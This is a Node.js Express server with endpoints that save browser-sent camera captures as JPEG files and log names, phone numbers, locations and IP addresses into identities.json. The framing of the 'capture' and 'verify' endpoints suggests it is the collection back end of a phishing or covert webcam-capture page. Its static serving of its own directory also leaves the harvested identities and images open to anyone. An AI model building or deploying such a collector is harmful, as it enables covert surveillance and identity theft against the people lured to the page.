const express = require('express');
const fs      = require('fs');
const path    = require('path');
const https   = require('https');
const http    = require('http');

const app     = express();
const IMG_DIR = path.join(__dirname, 'img');
const SSL_DIR = path.join(__dirname, 'ssl');

// Ensure img/ folder exists
if (!fs.existsSync(IMG_DIR)) fs.mkdirSync(IMG_DIR, { recursive: true });

// Enable CORS for all origins
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

app.use(express.json({ limit: '10mb' }));
app.use(express.static(__dirname));

// POST /api/capture  { img: "data:image/jpeg;base64,...", ts: 1234567890 }
app.post('/api/capture', (req, res) => {
  try {
    const { img, ts } = req.body;
    if (!img) return res.status(400).json({ error: 'No image data' });

    const base64Data = img.replace(/^data:image\/\w+;base64,/, '');
    const filename   = 'capture_' + (ts || Date.now()) + '.jpg';
    const filepath   = path.join(IMG_DIR, filename);

    fs.writeFileSync(filepath, Buffer.from(base64Data, 'base64'));
    console.log('[CAPTURE] Saved -> img/' + filename);

    res.json({ ok: true, file: filename });
  } catch (e) {
    console.error('[CAPTURE] Error:', e.message);
    res.status(500).json({ error: e.message });
  }
});

// POST /api/verify  { name, phone, location, ts }
app.post('/api/verify', (req, res) => {
  try {
    const { name, phone, location, ts } = req.body;
    const DATA_FILE = path.join(__dirname, 'identities.json');
    let records = [];
    if (fs.existsSync(DATA_FILE)) {
      try { records = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); } catch (e) {}
    }
    const newRecord = {
      name,
      phone,
      location: location || null,
      timestamp: new Date(ts || Date.now()).toISOString(),
      ip: req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress
    };
    records.push(newRecord);
    fs.writeFileSync(DATA_FILE, JSON.stringify(records, null, 2));
    console.log('[IDENTITY] Saved -> identities.json:', newRecord.name, newRecord.phone);
    res.json({ ok: true });
  } catch (e) {
    console.error('[IDENTITY] Error:', e.message);
    res.status(500).json({ error: e.message });
  }
});

// Start HTTP Server
const HTTP_PORT = process.env.PORT || 3000;
http.createServer(app).listen(HTTP_PORT, () => {
  console.log(`📡 HTTP Server:  http://localhost:${HTTP_PORT}`);
});

// Start HTTPS Server
const HTTPS_PORT = process.env.HTTPS_PORT || 8443;
const keyPath  = path.join(SSL_DIR, 'key.pem');
const certPath = path.join(SSL_DIR, 'cert.pem');

if (fs.existsSync(keyPath) && fs.existsSync(certPath)) {
  const sslOptions = {
    key: fs.readFileSync(keyPath),
    cert: fs.readFileSync(certPath)
  };
  https.createServer(sslOptions, app).listen(HTTPS_PORT, () => {
    console.log(`🔒 HTTPS Server: https://192.168.1.12:${HTTPS_PORT} (or https://localhost:${HTTPS_PORT})`);
    console.log(`📁 Captures will be saved to: ${IMG_DIR}\n`);
  });
} else {
  console.warn('⚠️ SSL certificate not found in ssl/ folder. HTTPS not started.');
}
